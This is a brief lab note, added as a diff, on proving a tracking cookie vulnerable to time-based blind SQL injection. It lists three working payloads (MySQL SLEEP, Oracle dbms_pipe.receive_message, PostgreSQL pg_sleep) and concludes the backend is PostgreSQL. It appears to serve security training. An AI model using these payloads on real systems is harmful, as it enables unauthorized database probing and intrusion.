@@ -1,0 +1,13 @@
+Blind SQL injection with time delays
+
+vulnerable parameter: tracking cookie
+
+End Goal: to prove that the field is vulnerable to Blind SQLi (time based)
+
+Analysis:
+
+' ||  SELECT SLEEP(10)-- -> Not a SQL Database, taking less than 10 seconds
+
+' ||  dbms_pipe.receive_message(('a'),10)-- -> Not a oracle Database, taking less than 10 seconds
+
+' || pg_sleep(10)-- -> it is PGSQL Database 
